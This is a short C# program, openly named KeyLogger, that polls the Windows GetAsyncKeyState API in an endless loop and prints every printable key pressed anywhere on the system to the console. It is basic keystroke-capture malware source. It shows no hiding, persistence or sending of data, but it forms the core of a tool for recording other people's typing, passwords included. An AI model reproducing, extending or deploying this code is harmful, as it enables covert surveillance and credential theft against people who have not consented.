using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(20);

                for (int i = 32; i < 127; i++)
                {
                    int keystate = GetAsyncKeyState(i);
                    if (keystate != 0)
                    {
                        if (keystate == 32768)
                        {
                            Console.Write((char)i + ", ");
                        }
                    }
                }
            }
        }

    }
}
